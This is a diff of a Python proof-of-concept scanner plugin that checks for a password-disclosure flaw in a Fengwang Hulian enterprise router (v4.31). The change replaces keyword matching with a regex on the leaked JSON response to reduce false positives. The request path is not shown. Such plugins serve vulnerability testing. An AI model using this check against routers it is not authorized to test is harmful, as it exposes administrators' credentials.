@@ -4,17 +4,19 @@ from lib.core.common import url_handle,get_random_ua
 from lib.core.poc import POCBase
 # ...
 import urllib3
+import re
 urllib3.disable_warnings()
 
 class POC(POCBase):
 
     _info = {
         "author" : "jijue",                      # POC作者
-        "version" : "1",                    # POC版本，默认是1  
+        "version" : "2",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-        略  
+            v1 : 略  
+            v2 : v1是字符串匹配，最然当时已经写得很严谨了，但仍有万分之一的几率会误报，改成了正则匹配可以解决
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "蜂网互联 企业级路由器v4.31 密码泄露漏洞",                        # 漏洞名称
@@ -54,8 +56,9 @@ class POC(POCBase):
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "note" in req.text and "status" in req.text and "pwd" in req.text and "aju" in req.text and req.status_code == 200:
+            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False , allow_redirects=False)
+            result = re.match("\{\"state\":1,\"rows\":\[\{\".+\}\]\}",req.text.strip())
+            if result != None and req.status_code == 200:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
